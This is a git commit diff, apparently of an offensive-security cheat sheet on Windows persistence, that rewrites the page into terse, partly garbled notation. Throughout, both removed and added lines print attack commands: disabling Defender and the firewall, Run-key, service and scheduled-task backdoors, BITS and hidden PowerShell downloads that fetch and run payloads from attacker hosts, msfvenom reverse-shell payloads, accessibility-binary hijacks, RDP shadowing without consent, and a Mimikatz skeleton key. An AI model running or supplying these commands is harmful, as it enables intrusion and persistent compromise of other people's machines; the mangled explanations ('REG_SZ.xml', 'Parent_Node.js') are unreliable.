c97ceff88e874e7f6dc4ef9aa6654d6451bcc093
Z4 <30985576+TheProdigyLeague@users.noreply.github.com>
2023-03-31 17:42:25 -0400

    upd
    windows skeleton key

--- Methodology and Resources/SHARD*PERSIST.ps1
+++ Methodology and Resources/SHARD*PERSIST.ps1
@@ -29,106 +29,82 @@
     * [Remote Desktop Services Shadowing](#remote-desktop-services-shadowing)
     * [Skeleton Key](#skeleton-key)
 * [References](#references)
-
-
 ## Tools
-
-- [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)
-
+- [SharPersist] 
+*Windows persistence toolkit written in C#. 
+BY: [@h4wkst3r](https://github.com/fireeye/SharPersist)
 ## Hide Your Binary
-
-> Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.
-
+> Sets (+) clears (-) 
+>Hidden-File-Attribute[HFA]; {if file, use attr [SET], [CLEAR], ATTR};
+>MOD ATTR FOR FILE 
 ```ps1
 PS> attrib +h mimikatz.exe
 ```
-
 ## Disable Windows Defender
-
 ```powershell
 # Disable Defender
-sc config WinDefend start= disabled
-sc stop WinDefend
-Set-MpPreference -DisableRealtimeMonitoring $true
-
+>sc config WinDefend start= disabled
+>sc stop WinDefend
+>Set-MpPreference -DisableRealtimeMonitoring $true
 ## Exclude a process / location
-Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
-Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
-Add-MpPreference -ExclusionPath C:\Video, C:\install
+>Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
+>Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+>Add-MpPreference -ExclusionPath C:\Video, C:\install
 ```
-
 ## Disable Windows Firewall
-
 ```powershell
-Netsh Advfirewall show allprofiles
-NetSh Advfirewall set allprofiles state off
-
+>Netsh Advfirewall show allprofiles
+>NetSh Advfirewall set allprofiles state off
 # ip whitelisting
-New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+>New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
 ```
-
 ## Simple User
-
-Set a file as hidden
-
+>[SET] -file --hidden
 ```powershell
-attrib +h c:\autoexec.bat
+>attrib +h c:\autoexec.bat
 ```
-
 ### Registry HKCU
-
-Create a REG_SZ value in the Run key within HKCU\Software\Microsoft\Windows.
+>Create REG_SZ.xml VALUE in [RUN]::key 
+>HKCU\Software\Microsoft\Windows.
+```powershell
+>Value name:  Backdoor
+>Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
+```
+$cmd 
 
 ```powershell
-Value name:  Backdoor
-Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
+>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
 ```
-
-Using the command line 
-
+$SharPersist
 ```powershell
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+>SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
+>SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env
+>SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
 ```
-
-Using SharPersist
-
-```powershell
-SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
-SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env
-SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
-```
-
 ### Startup
-
-Create a batch script in the user startup folder.
-
+$ script.bat in ["USER", "START"] \folder
 ```powershell
 PS C:\> gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
-start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
+>start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
 ```
-
-Using SharPersist
-
+$SharPersist
 ```powershell
-SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
+>SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
 ```
-
 ### Scheduled Tasks User
-
-Using native **schtask**
-
+[!]
+native:**schtask**
 ```powershell
-# Create the scheduled tasks to run once at 00.00
-schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
-# Force run it now !
-schtasks /run /tn "Device-Synchronize"
+>schedule-task 
+>run at 00.00
+>schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
+# F o r c e-r u n n o w !
+>schtasks /run /tn "Device-Synchronize"
 ```
-
-Using Powershell
-
+$Powershell
 ```powershell
 PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
 PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
@@ -137,126 +113,83 @@ PS C:\> $S = New-ScheduledTaskSettingsSet
 PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
 PS C:\> Register-ScheduledTask Backdoor -InputObject $D
 ```
-
-Using SharPersist
-
+$SharPersist
 ```powershell
 # Add to a current scheduled task
-SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
-
+>SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
 # Add new task
-SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
-SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
+>SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
+>SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
 ```
-
-
 ### BITS Jobs
-
 ```powershell
-bitsadmin /create backdoor
-bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"
-
+>bitsadmin /create backdoor
+>bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"
 # v1
-bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
-bitsadmin /SetMinRetryDelay "backdoor" 60
-bitsadmin /resume backdoor
-
+>bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
+>bitsadmin /SetMinRetryDelay "backdoor" 60
+>bitsadmin /resume backdoor
 # v2 - exploit/multi/script/web_delivery
-bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
-bitsadmin /resume backdoor
+>bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
+>bitsadmin /resume backdoor
 ```
-
-## Serviceland
-
-### IIS
-
-IIS Raid – Backdooring IIS Using Native Modules
-
+## Serviceland, IIS Raid – Backdooring IIS Using Native Modules
 ```powershell
 $ git clone https://github.com/0x09AL/IIS-Raid
 $ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
 C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
 ```
-
 ### Windows Service
-
-Using SharPersist
-
+$SharPersist
 ```powershell
-SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
+>SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
 ```
-
-## Elevated
-
-### Registry HKLM
-
-Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\Software\Microsoft\Windows.
-
+## Elevated, Registry HKLM
+# Similar to HKCU. 
+$ -create REG_SZ.xml \value\run-key\+HKLM/Software\Microsoft\Windows
 ```powershell
-Value name:  Backdoor
-Value data:  C:\Windows\Temp\backdoor.exe
+>Value name:  Backdoor
+>Value data:  C:\Windows\Temp\backdoor.exe
 ```
-
-Using the command line 
-
+$cmd.exe
 ```powershell
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
+>reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
+>reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
+>reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
+>reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
 ```
-
 #### Winlogon Helper DLL
-
 > Run executable during Windows logon
-
 ```powershell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll
-
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
-Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
-Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
+>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
+>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll
+>reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
+>reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
+>Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
+>Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
 ```
-
-
 #### GlobalFlag
-
-> Run executable after notepad is killed
-
+$ -kill notepad.exe
+$ -Run.exec
 ```powershell
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
+>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
 ```
-
-
 ### Services Elevated
-
-Create a service that will start automatically or on-demand.
-
-```powershell
-# Powershell
-New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic
-sc start pentestlab
-
+$ -create srvc.exe | Auto-Start
+```Powershell
+>New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "默认。有效载荷。跑步" -StartupType Automatic
+>sc start pentestlab
 # SharPersist
-SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add
-
+$ -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add
 # sc
-sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
-sc start Backdoor
+>sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
+>sc start Backdoor
 ```
-
-### Scheduled Tasks Elevated
-
-Scheduled Task to run as SYSTEM, everyday at 9am or on a specific day.
-
-> Processes spawned as scheduled tasks have taskeng.exe process as their parent
-
+###Scheduled Task to run as SYSTEM, everyday at 9am or on a specific day.
+$ -spawn -process -schedule -task --taskeng.exe | Parent_Node.js
 ```powershell
-# Powershell
 $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\backdoor.exe"
 $T = New-ScheduledTaskTrigger -Daily -At 9am
 # OR
@@ -265,11 +198,9 @@ $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
 $S = New-ScheduledTaskSettingsSet
 $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
 Register-ScheduledTask "Backdoor" -InputObject $D
-
 # Native schtasks
-schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
-schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
-
+$ schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
+$ schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
 ##(X86) - On User Login
 schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
  
@@ -288,11 +219,7 @@ schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v
 ##(X64) - On User Idle (30mins)
 schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 ```
-
-### Binary Replacement
-
 #### Binary Replacement on Windows XP+
-
 | Feature             | Executable                            |
 |---------------------|---------------------------------------|
 | Sticky Keys         | C:\Windows\System32\sethc.exe         |
@@ -303,68 +230,45 @@ schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v
 | Display Switcher    | C:\Windows\System32\DisplaySwitch.exe |
 | App Switcher        | C:\Windows\System32\AtBroker.exe      |
 
-In Metasploit : `use post/windows/manage/sticky_keys`
-
+>>>import Metasploit::`use post/windows/manage/sticky_keys`
 #### Binary Replacement on Windows 10+
-
-Exploit a DLL hijacking vulnerability in the On-Screen Keyboard **osk.exe** executable.
-
-Create a malicious **HID.dll** in  `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
-
-
-### RDP Backdoor
-
-#### utilman.exe
-
-At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.
-
+> -xploit *runtime.dll \vuln*osk.exe 
+# On-Screen Keyboard **osk.exe** executable.
+$ -create **HID.dll
+$ `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
+### RDP Backdoor...utilman.exe
+[+]login screen, Windows Key+U --git cmd.exe window/SYSTEM.
 ```powershell
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+>REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
-
 #### sethc.exe
- 
-Hit F5 a bunch of times when you are at the RDP login screen.
-
+// SMASH F5 for RDP login screen.
 ```powershell
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+>REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
-
 ### Remote Desktop Services Shadowing
-
 :warning: FreeRDP and rdesktop don't support Remote Desktop Services Shadowing feature.
-
 Requirements:
 * RDP must be running
-
 ```powershell
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4
-# 4 – View Session without user’s permission.
-
-# Allowing remote connections to this computer
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
-
+>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4
+# 4 – View Session without user’s permission. Allowing remote connections to this computer
+>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 # Disable UAC remote restriction
-reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-
-mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt
+>reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+>mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt
 # /v parameter lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host;
 # /shadow parameter is used to specify the {SESSION_ID} value that is a shadowee’s session ID;
 # /noconsentprompt parameter allows to bypass a shadowee’s permission and shadow their session without their consent;
 # /prompt parameter is used to specify a user’s credentials to connect to a remote host.
 ```
-
-### Skeleton Key
-
+### SKELETON-KEY!
 ```powershell
 # Exploitation Command runned as DA:
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>
-
 # Access using the password "mimikatz"
 Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
 ```
-
 ## References
 
 * [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
